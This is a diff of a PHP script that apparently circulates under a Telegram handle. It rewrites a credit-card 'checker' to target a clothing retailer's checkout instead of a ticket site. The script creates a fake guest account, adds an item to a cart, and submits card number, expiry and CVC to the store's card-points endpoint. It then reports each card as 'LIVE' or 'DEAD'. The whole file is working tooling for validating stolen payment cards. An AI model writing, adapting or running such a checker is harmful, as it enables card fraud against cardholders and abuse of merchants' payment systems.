@@ -1,211 +1,204 @@
 <?php
+/**
+ * Penti Card Points API
+ * Kredi kartı puan sorgulama
+ * telegram : @unutur
+ */
+
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
 
-class UcakBiletiCCChecker {
-    private $apiUrl = "https://www.ucakbileti.com.tr/ajax/check_reward_points";
-    
-    public function checkCardPoints($cardNumber, $expiryMonth, $expiryYear) {
-        // Kart numarasını temizle
-        $cleanCardNumber = preg_replace('/[^0-9]/', '', $cardNumber);
-        
-        // API payload'ı
-        $payload = [
-            "cardNumber" => $cleanCardNumber,
-            "expireMonth" => str_pad($expiryMonth, 2, '0', STR_PAD_LEFT),
-            "expireYear" => $expiryYear
-        ];
-        
-        // cURL ile istek gönder
-        $ch = curl_init();
-        
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $this->apiUrl,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => http_build_query($payload),
-            CURLOPT_HTTPHEADER => [
-                'Content-Type: application/x-www-form-urlencoded',
-                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept: */*',
-                'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Accept-Encoding: gzip, deflate, br',
-                'Origin: https://www.ucakbileti.com.tr',
-                'Referer: https://www.ucakbileti.com.tr/',
-                'Sec-Fetch-Dest: empty',
-                'Sec-Fetch-Mode: cors',
-                'Sec-Fetch-Site: same-origin',
-                'X-Requested-With: XMLHttpRequest'
-            ],
-            CURLOPT_TIMEOUT => 30,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_ENCODING => 'gzip'
-        ]);
-        
-        $response = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $curlError = curl_error($ch);
-        curl_close($ch);
-        
-        if ($curlError) {
-            return [
-                'success' => false,
-                'error' => 'CURL Error: ' . $curlError,
-                'status_code' => $httpCode
-            ];
-        }
-        
-        return [
-            'success' => true,
-            'status_code' => $httpCode,
-            'raw_response' => $response,
-            'parsed_response' => $this->parseResponse($response)
-        ];
-    }
-    
-    private function parseResponse($response) {
-        // JSON formatını kontrol et
-        $decoded = json_decode($response, true);
-        
-        if (json_last_error() === JSON_ERROR_NONE) {
-            return $decoded;
-        }
-        
-        // HTML response ise parse etmeye çalış
-        return $this->parseHTMLResponse($response);
-    }
-    
-    private function parseHTMLResponse($html) {
-        // HTML içinden puan bilgisini çıkarmaya çalış
-        $patterns = [
-            '/puan.*?([0-9]+[.,]?[0-9]*)/i',
-            '/points.*?([0-9]+[.,]?[0-9]*)/i',
-            '/reward.*?([0-9]+[.,]?[0-9]*)/i',
-            '/amount.*?([0-9]+[.,]?[0-9]*)/i',
-            '/"amount":\s*"([0-9]+[.,]?[0-9]*)"/i',
-            '/"points":\s*"([0-9]+[.,]?[0-9]*)"/i'
-        ];
-        
-        $points = null;
-        $currency = 'TRY';
-        
-        foreach ($patterns as $pattern) {
-            if (preg_match($pattern, $html, $matches)) {
-                $points = floatval(str_replace(',', '.', $matches[1]));
-                break;
-            }
-        }
-        
-        return [
-            'points' => $points,
-            'currency' => $currency,
-            'raw_html' => substr($html, 0, 500) // İlk 500 karakter
-        ];
-    }
-    
-    public function formatCardNumber($cardNumber) {
-        $clean = preg_replace('/[^0-9]/', '', $cardNumber);
-        return [
-            'raw' => $cardNumber,
-            'clean' => $clean,
-            'formatted' => implode(' ', str_split($clean, 4)),
-            'bin' => substr($clean, 0, 6),
-            'last4' => substr($clean, -4)
-        ];
-    }
-    
-    public function validateInput($cardNumber, $expiryMonth, $expiryYear) {
-        $errors = [];
-        
-        // Kart numarası validation
-        $cleanCard = preg_replace('/[^0-9]/', '', $cardNumber);
-        if (strlen($cleanCard) < 15 || strlen($cleanCard) > 16) {
-            $errors[] = 'Geçersiz kart numarası';
-        }
-        
-        // Ay validation
-        if ($expiryMonth < 1 || $expiryMonth > 12) {
-            $errors[] = 'Geçersiz son kullanma ayı';
-        }
-        
-        // Yıl validation
-        $currentYear = date('Y');
-        if ($expiryYear < $currentYear || $expiryYear > $currentYear + 10) {
-            $errors[] = 'Geçersiz son kullanma yılı';
-        }
-        
-        return $errors;
-    }
+// OPTIONS isteği için
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit();
 }
 
-// API İsteklerini İşleme
-$checker = new UcakBiletiCCChecker();
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $input = json_decode(file_get_contents('php://input'), true);
-    
-    $cardNumber = $input['card_number'] ?? ($_POST['card_number'] ?? '');
-    $expiryMonth = $input['expiry_month'] ?? ($_POST['expiry_month'] ?? '');
-    $expiryYear = $input['expiry_year'] ?? ($_POST['expiry_year'] ?? '');
-    
-    // Input validation
-    $validationErrors = $checker->validateInput($cardNumber, $expiryMonth, $expiryYear);
-    
-    if (!empty($validationErrors)) {
-        echo json_encode([
-            'success' => false,
-            'errors' => $validationErrors
-        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
-        exit;
-    }
-    
-    // Kart puanını kontrol et
-    $result = $checker->checkCardPoints($cardNumber, $expiryMonth, $expiryYear);
-    
-    // Formatlı kart bilgisi
-    $cardInfo = $checker->formatCardNumber($cardNumber);
-    
-    // Sonuçları birleştir
-    $finalResult = [
-        'success' => $result['success'],
-        'card_info' => $cardInfo,
-        'status_code' => $result['status_code'],
-        'checked_at' => date('Y-m-d H:i:s'),
-         'telegram' => ('unutur'),
-        'api_response' => $result['parsed_response']
-    ];
-    
-    if (!$result['success']) {
-        $finalResult['error'] = $result['error'];
-    }
-    
-    echo json_encode($finalResult, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
-    
-} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
-    // GET isteği için bilgi sayfası
-    $exampleData = [
-        'card_number' => '4543601234567890',
-        'expiry_month' => '12',
-        'expiry_year' => '2025'
-    ];
-    
+// GET ile bilgi
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     echo json_encode([
-        'message' => 'CC Puan Checker API',
+        'success' => true,
+        'api' => 'Penti Card Points API',
         'version' => '1.0',
         'endpoint' => 'POST /',
         'parameters' => [
-            'card_number' => 'Kart numarası (16 haneli)',
-            'expiry_month' => 'Son kullanma ayı (1-12)',
-            'expiry_year' => 'Son kullanma yılı (2024-2030)'
+            'card_number' => 'Kart numarası (16 hane)',
+            'expire_month' => 'Son kullanma ayı (01-12)',
+            'expire_year' => 'Son kullanma yılı (2024-2030)',
+            'cvc' => 'CVC kodu (3-4 hane)'
         ],
-        'example' => $exampleData,
-        'usage' => [
-            'curl' => 'curl -X POST -H "Content-Type: application/json" -d \'' . json_encode($exampleData) . '\' ' . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
-            'javascript' => 'fetch("' . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(' . json_encode($exampleData) . ')})'
-        ]
+        'example' => [
+            'card_number' => '4289451234567897',
+            'expire_month' => '12',
+            'expire_year' => '2028',
+            'cvc' => '123'
+        ],
+        'telegram' => '@unutur'
     ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    exit();
+}
+
+// POST ile kart sorgulama
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // JSON input al
+    $input = json_decode(file_get_contents('php://input'), true);
+    
+    if (!$input) {
+        // Form data da olabilir
+        $input = $_POST;
+    }
+    
+    $card_number = isset($input['card_number']) ? preg_replace('/[^0-9]/', '', $input['card_number']) : '';
+    $expire_month = isset($input['expire_month']) ? str_pad($input['expire_month'], 2, '0', STR_PAD_LEFT) : '';
+    $expire_year = isset($input['expire_year']) ? $input['expire_year'] : '';
+    $cvc = isset($input['cvc']) ? $input['cvc'] : '';
+    
+    // Validasyon
+    if (empty($card_number) || empty($expire_month) || empty($expire_year) || empty($cvc)) {
+        echo json_encode([
+            'success' => false,
+            'error' => '❌ Eksik parametre',
+            'required' => ['card_number', 'expire_month', 'expire_year', 'cvc'],
+            'telegram' => '@unutur'
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+        exit();
+    }
+    
+    if (strlen($card_number) < 15 || strlen($card_number) > 16) {
+        echo json_encode([
+            'success' => false,
+            'error' => '❌ Geçersiz kart numarası',
+            'telegram' => '@unutur'
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+        exit();
+    }
+    
+    if ($expire_month < 1 || $expire_month > 12) {
+        echo json_encode([
+            'success' => false,
+            'error' => '❌ Geçersiz ay',
+            'telegram' => '@unutur'
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+        exit();
+    }
+    
+    if (strlen($expire_year) == 2) {
+        $expire_year = '20' . $expire_year;
+    }
+    
+    // Penti API'ye istek
+    $penti_url = 'https://www.penti.com/tr/checkout/multi/delivery-address/cardPointInfo';
+    
+    // CSRF token al
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://www.penti.com/tr/checkout/multi/delivery-address/add');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $html = curl_exec($ch);
+    curl_close($ch);
+    
+    preg_match('/name="CSRFToken" value="(.+?)"/', $html, $csrf_match);
+    $csrf = $csrf_match[1] ?? '';
+    
+    // Guest giriş yap
+    $guest_data = http_build_query([
+        'email' => time() . rand(1000, 9999) . '@gmail.com',
+        'CSRFToken' => $csrf
+    ]);
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://www.penti.com/tr/login/checkout/guest');
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $guest_data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
+    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
+    curl_exec($ch);
+    curl_close($ch);
+    
+    // Sepete ürün ekle
+    $cart_data = http_build_query([
+        'qty' => '1',
+        'productCodePost' => 'PH7HC6N725SKWT8XL',
+        'CSRFToken' => $csrf
+    ]);
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://www.penti.com/tr/cart/add');
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $cart_data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
+    curl_exec($ch);
+    curl_close($ch);
+    
+    // Puan sorgula
+    $payload = [
+        'cardNumber' => $card_number,
+        'expireMonth' => $expire_month,
+        'expireYear' => $expire_year,
+        'cvc' => $cvc
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $penti_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json',
+        'X-Requested-With: XMLHttpRequest',
+        'Cookie: ' . implode('; ', file('cookies.txt', FILE_IGNORE_NEW_LINES) ?: [])
+    ]);
+    
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    $data = json_decode($response, true);
+    
+    // Sonucu düzenle
+    $point_amount = $data['pointAmount']['value'] ?? null;
+    
+    if ($http_code == 200 && $point_amount !== null && $point_amount > 0) {
+        echo json_encode([
+            'success' => true,
+            'card_number' => substr($card_number, 0, 6) . '******' . substr($card_number, -4),
+            'points' => $point_amount,
+            'currency' => 'TL',
+            'status' => 'LIVE',
+            'message' => '✅ Kart geçerli ve puan var!',
+            'telegram' => '@unutur'
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    } elseif ($http_code == 200) {
+        echo json_encode([
+            'success' => true,
+            'card_number' => substr($card_number, 0, 6) . '******' . substr($card_number, -4),
+            'points' => 0,
+            'currency' => 'TL',
+            'status' => 'DEAD',
+            'message' => '❌ Kart geçersiz veya puan yok',
+            'telegram' => '@unutur'
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    } else {
+        echo json_encode([
+            'success' => false,
+            'error' => 'API hatası',
+            'http_code' => $http_code,
+            'telegram' => '@unutur'
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    }
+    
+    // Temizlik
+    @unlink('cookies.txt');
 }
 ?>
